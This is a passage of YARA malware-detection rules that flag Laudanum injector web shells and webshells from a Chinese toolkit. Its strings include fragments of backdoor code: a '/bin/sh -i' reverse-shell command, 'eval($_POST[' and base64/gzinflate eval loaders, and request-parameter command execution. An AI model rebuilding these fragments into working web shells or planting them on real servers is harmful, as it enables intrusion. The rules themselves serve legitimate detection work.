($_SERVER[\\\"REMOTE_ADDR\\\"] == $IP)\" fullword ascii\n        $s2 = \"header(\\\"HTTP/1.0 404 Not Found\\\");\" fullword ascii\n        $s3 = \"<?php echo exec('killall nc');?>\" fullword ascii\n        $s4 = \"<title>Laudanum Kill nc</title>\" fullword ascii\n        $s5 = \"foreach ($allowedIPs as $IP) {\" fullword ascii\n\n    condition:\n        filesize < 15KB and 4 of them\n}\n\nrule Laudanum_asp_shell\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: shell.asp)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"asp_shell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<form action=\\\"shell.asp\\\" method=\\\"POST\\\" name=\\\"shell\\\">\" fullword ascii\n        $s2 = \"%ComSpec% /c dir\" fullword ascii\n        $s3 = \"Set objCmd = wShell.Exec(cmd)\" fullword ascii\n        $s4 = \"Server.ScriptTimeout = 180\" fullword ascii\n        $s5 = \"cmd = Request.Form(\\\"cmd\\\")\" fullword ascii\n        $s6 = \"' ***  http://laudanum.secureideas.net\" fullword ascii\n        $s7 = \"Dim wshell, intReturn, strPResult\" fullword ascii\n\n    condition:\n        filesize < 15KB and 4 of them\n}\n\nrule Laudanum_settings\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: settings.php)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"settings\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Port: <input name=\\\"port\\\" type=\\\"text\\\" value=\\\"8888\\\">\" fullword ascii\n        $s2 = \"<li>Reverse Shell - \" fullword ascii\n        $s3 = \"<li><a href=\\\"<?php echo plugins_url('file.php', __FILE__);?>\\\">File Browser</a>\" ascii\n\n    condition:\n        filesize < 13KB and all of them\n}\n\nrule Laudanum_asp_proxy\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: proxy.asp)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"asp_proxy\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"'response.write \\\"<br/>  -value:\\\" & request.querystring(key)(j)\" fullword ascii\n        $s2 = \"q = q & \\\"&\\\" & key & \\\"=\\\" & request.querystring(key)(j)\" fullword ascii\n        $s3 = \"for each i in Split(http.getAllResponseHeaders, vbLf)\" fullword ascii\n        $s4 = \"'urlquery = mid(urltemp, instr(urltemp, \\\"?\\\") + 1)\" fullword ascii\n        $s5 = \"s = urlscheme & urlhost & urlport & urlpath\" fullword ascii\n        $s6 = \"Set http = Server.CreateObject(\\\"Microsoft.XMLHTTP\\\")\" fullword ascii\n\n    condition:\n        filesize < 50KB and all of them\n}\n\nrule Laudanum_cfm_shell\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: shell.cfm)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"cfm_shell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Executable: <Input type=\\\"text\\\" name=\\\"cmd\\\" value=\\\"cmd.exe\\\"><br>\" fullword ascii\n        $s2 = \"<cfif ( #suppliedCode# neq secretCode )>\" fullword ascii\n        $s3 = \"<cfif IsDefined(\\\"form.cmd\\\")>\" fullword ascii\n\n    condition:\n        filesize < 20KB and 2 of them\n}\n\nrule Laudanum_aspx_shell\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: shell.aspx)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"aspx_shell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"remoteIp = HttpContext.Current.Request.Headers[\\\"X-Forwarded-For\\\"].Split(new\" ascii\n        $s2 = \"remoteIp = Request.UserHostAddress;\" fullword ascii\n        $s3 = \"<form method=\\\"post\\\" name=\\\"shell\\\">\" fullword ascii\n        $s4 = \"<body onload=\\\"document.shell.c.focus()\\\">\" fullword ascii\n\n    condition:\n        filesize < 20KB and all of them\n}\n\nrule Laudanum_php_shell\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: shell.php)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"php_shell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"command_hist[current_line] = document.shell.command.value;\" fullword ascii\n        $s2 = \"if (e.keyCode == 38 && current_line < command_hist.length-1) {\" fullword ascii\n        $s3 = \"array_unshift($_SESSION['history'], $command);\" fullword ascii\n        $s4 = \"if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {\" fullword ascii\n\n    condition:\n        filesize < 40KB and all of them\n}\n\nrule Laudanum_php_reverse_shell\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: php-reverse-shell.php)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"php_reverse_shell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$process = proc_open($shell, $descriptorspec, $pipes);\" fullword ascii\n        $s2 = \"printit(\\\"Successfully opened reverse shell to $ip:$port\\\");\" fullword ascii\n        $s3 = \"$input = fread($pipes[1], $chunk_size);\" fullword ascii\n\n    condition:\n        filesize < 15KB and all of them\n}\n\nrule Laudanum_php_dns\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: dns.php)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"php_dns\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$query = isset($_POST['query']) ? $_POST['query'] : '';\" fullword ascii\n        $s2 = \"$result = dns_get_record($query, $types[$type], $authns, $addtl);\" fullword ascii\n        $s3 = \"if ($_SERVER[\\\"REMOTE_ADDR\\\"] == $IP)\" fullword ascii\n        $s4 = \"foreach (array_keys($types) as $t) {\" fullword ascii\n\n    condition:\n        filesize < 15KB and all of them\n}\n\nrule Laudanum_WEB_INF_web\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: web.xml)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WEB_INF_web\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<servlet-name>Command</servlet-name>\" fullword ascii\n        $s2 = \"<jsp-file>/cmd.jsp</jsp-file>\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule Laudanum_jsp_cmd\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: cmd.war)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"jsp_cmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"cmd.jsp}\" fullword ascii\n        $s1 = \"cmd.jspPK\" fullword ascii\n        $s2 = \"WEB-INF/web.xml\" fullword ascii\n        $s3 = \"WEB-INF/web.xmlPK\" fullword ascii\n        $s4 = \"META-INF/MANIFEST.MF\" fullword ascii\n\n    condition:\n        uint16(0) == 0x4b50 and filesize < 2KB and all of them\n}\n\nrule Laudanum_laudanum\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: laudanum.php)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"laudanum\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"public function __activate()\" fullword ascii\n        $s2 = \"register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));\" fullword ascii\n\n    condition:\n        filesize < 5KB and all of them\n}\n\nrule Laudanum_php_file\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: file.php)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"php_file\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$allowedIPs =\" fullword ascii\n        $s2 = \"<a href=\\\"<?php echo $_SERVER['PHP_SELF']  ?>\\\">Home</a><br/>\" fullword ascii\n        $s3 = \"$dir  = isset($_GET[\\\"dir\\\"])  ? $_GET[\\\"dir\\\"]  : \\\".\\\";\" fullword ascii\n        $s4 = \"$curdir .= substr($curdir, -1) != \\\"/\\\" ? \\\"/\\\" : \\\"\\\";\" fullword ascii\n\n    condition:\n        filesize < 10KB and all of them\n}\n\nrule Laudanum_warfiles_cmd\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: cmd.jsp)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"warfiles_cmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Process p = Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\"));\" fullword ascii\n        $s2 = \"out.println(\\\"Command: \\\" + request.getParameter(\\\"cmd\\\") + \\\"<BR>\\\");\" fullword ascii\n        $s3 = \"<FORM METHOD=\\\"GET\\\" NAME=\\\"myform\\\" ACTION=\\\"\\\">\" fullword ascii\n        $s4 = \"String disr = dis.readLine();\" fullword ascii\n\n    condition:\n        filesize < 2KB and all of them\n}\n\nrule Laudanum_asp_dns\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: dns.asp)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"asp_dns\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"command = \\\"nslookup -type=\\\" & qtype & \\\" \\\" & query \" fullword ascii\n        $s2 = \"Set objCmd = objWShell.Exec(command)\" fullword ascii\n        $s3 = \"Response.Write command & \\\"<br>\\\"\" fullword ascii\n        $s4 = \"<form name=\\\"dns\\\" method=\\\"POST\\\">\" fullword ascii\n\n    condition:\n        filesize < 21KB and all of them\n}\n\nrule Laudanum_php_reverse_shell_2\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: php-reverse-shell.php)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"php_reverse_shell_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$process = proc_open($shell, $descriptorspec, $pipes);\" fullword ascii\n        $s7 = \"$shell = 'uname -a; w; id; /bin/sh -i';\" fullword ascii\n\n    condition:\n        filesize < 10KB and all of them\n}\n\nrule Laudanum_Tools_Generic\n{\n    meta:\n        description = \"Laudanum Injector Tools\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Laudanum_Tools_Generic\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"***  laudanum@secureideas.net\" fullword ascii\n        $s2 = \"*** Laudanum Project\" fullword ascii\n\n    condition:\n        filesize < 60KB and all of them\n}\n\nrule Webshell_CN_PHP_php5\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php5.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_php5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user\" ascii\n        $s20 = \"echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\\\"<b>\\\".$\" ascii\n\n    condition:\n        uint16(0) == 0x3f3c and filesize < 300KB and all of them\n}\n\nrule Webshell_CN_test3693\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: test3693.war)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_test3693\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Process p=Runtime.getRuntime().exec(\\\"cmd /c \\\"+strCmd);\" fullword ascii\n        $s2 = \"http://www.topronet.com </font>\\\",\\\" <font color=red> Thanks for your support - \" ascii\n\n    condition:\n        uint16(0) == 0x4b50 and filesize < 50KB and all of them\n}\n\nrule Webshell_CN_mycode12\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: mycode12.cfm)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_mycode12\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<cfexecute name=\\\"cmd.exe\\\"\" fullword ascii\n        $s2 = \"<cfoutput>#cmd#</cfoutput>\" fullword ascii\n\n    condition:\n        filesize < 4KB and all of them\n}\n\nrule Webshell_CN_offlibrary\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: offlibrary.php)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_offlibrary\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"';$i=$g->query(\\\"SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1) AS User, SUBSTRING\" ascii\n        $s12 = \"if(jushRoot){var script=document.createElement('script');script.src=jushRoot+'ju\" ascii\n\n    condition:\n        filesize < 1005KB and all of them\n}\n\nrule Webshell_CN_cfm_xl\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: xl.cfm)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_cfm_xl\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<input name=\\\"DESTINATION\\\" value=\\\"\" ascii\n        $s1 = \"<CFFILE ACTION=\\\"Write\\\" FILE=\\\"#Form.path#\\\" OUTPUT=\\\"#Form.cmd#\\\">\" fullword ascii\n\n    condition:\n        uint16(0) == 0x433c and filesize < 13KB and all of them\n}\n\nrule Webshell_CN_PHP_linux\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: linux.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_linux\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<form name=form1 action=exploit.php method=post>\" fullword ascii\n        $s1 = \"<title>Changing CHMOD Permissions Exploit \" fullword ascii\n\n    condition:\n        uint16(0) == 0x696c and filesize < 6KB and all of them\n}\n\nrule Webshell_CN_Interception3389_get\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: get.asp)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Interception3389_get\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"userip = Request.ServerVariables(\\\"HTTP_X_FORWARDED_FOR\\\")\" fullword ascii\n        $s1 = \"file.writeline  szTime + \\\" HostName:\\\" + szhostname + \\\" IP:\\\" + userip+\\\":\\\"+n\" ascii\n        $s3 = \"set file=fs.OpenTextFile(server.MapPath(\\\"WinlogonHack.txt\\\"),8,True)\" fullword ascii\n\n    condition:\n        filesize < 3KB and all of them\n}\n\nrule Webshell_CN_nc_1\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: 1.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_nc_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 \" ascii\n        $s2 = \"<%if session(\\\"pw\\\")<>\\\"go\\\" then %>\" fullword ascii\n\n    condition:\n        filesize < 11KB and all of them\n}\n\nrule Webshell_CN_PHP_BlackSky\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php6.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_BlackSky\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"eval(gzinflate(base64_decode('\" ascii\n        $s1 = \"B1ac7Sky-->\" fullword ascii\n\n    condition:\n        filesize < 641KB and all of them\n}\n\nrule Webshell_CN_ASP_asp3\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: asp3.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASP_asp3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"if shellpath=\\\"\\\" then shellpath = \\\"cmd.exe\\\"\" fullword ascii\n        $s2 = \"c.open \\\"GET\\\", \\\"http://127.0.0.1:\\\" & port & \\\"/M_Schumacher/upadmin/s3\\\", Tru\" ascii\n\n    condition:\n        filesize < 444KB and all of them\n}\n\nrule Webshell_CN_ASPX_sniff\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: sniff.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASPX_sniff\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));\" fullword ascii\n        $s2 = \"if (!logIt && my_s_smtp && (dport == 25 || sport == 25))\" fullword ascii\n\n    condition:\n        filesize < 91KB and all of them\n}\n\nrule Webshell_CN_udf_udf\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: udf.php)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_udf_udf\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<?php // Source  My : Meiam  \" fullword ascii\n        $s2 = \"$OOO0O0O00=__FILE__;$OOO000000=urldecode('\" ascii\n\n    condition:\n        filesize < 430KB and all of them\n}\n\nrule Webshell_CN_JSP_jsp\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: jsp.html)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_JSP_jsp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<input name=f size=30 value=shell.jsp>\" fullword ascii\n        $s2 = \"<font color=red>www.i0day.com  By:\" fullword ascii\n\n    condition:\n        filesize < 3KB and all of them\n}\n\nrule Webshell_CN_T00ls_Lpk_Sethc_v4_mail\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: mail.php)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_T00ls_Lpk_Sethc_v4_mail\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"if (!$this->smtp_putcmd(\\\"AUTH LOGIN\\\", base64_encode($this->user)))\" fullword ascii\n        $s2 = \"$this->smtp_debug(\\\"> \\\".$cmd.\\\"\\\\n\\\");\" fullword ascii\n\n    condition:\n        filesize < 39KB and all of them\n}\n\nrule Webshell_CN_phpwebbackup\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: phpwebbackup.php)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_phpwebbackup\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<?php // Code By isosky www.nbst.org\" fullword ascii\n        $s2 = \"$OOO0O0O00=__FILE__;$OOO000000=urldecode('\" ascii\n\n    condition:\n        uint16(0) == 0x3f3c and filesize < 67KB and all of them\n}\n\nrule Webshell_CN_dz_phpcms_phpbb\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: dz_phpcms_phpbb.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_dz_phpcms_phpbb\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"if($pwd == md5(md5($password).$salt))\" fullword ascii\n        $s2 = \"function test_1($password)\" fullword ascii\n        $s3 = \":\\\".$pwd.\\\"\\\\n---------------------------------\\\\n\\\";exit;\" fullword ascii\n        $s4 = \":user=\\\".$user.\\\"\\\\n\\\";echo \\\"pwd=\\\".$pwd.\\\"\\\\n\\\";echo \\\"salt=\\\".$salt.\\\"\\\\n\\\";\" fullword ascii\n\n    condition:\n        filesize < 22KB and all of them\n}\n\nrule Webshell_CN_picloaked_1\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: 1.gif)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_picloaked_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<?php eval($_POST[\" ascii\n        $s1 = \";<%execute(request(\" ascii\n        $s3 = \"GIF89a\" fullword ascii\n\n    condition:\n        filesize < 6KB and 2 of them\n}\n\nrule Webshell_CN_assembly\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: assembly.asp)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 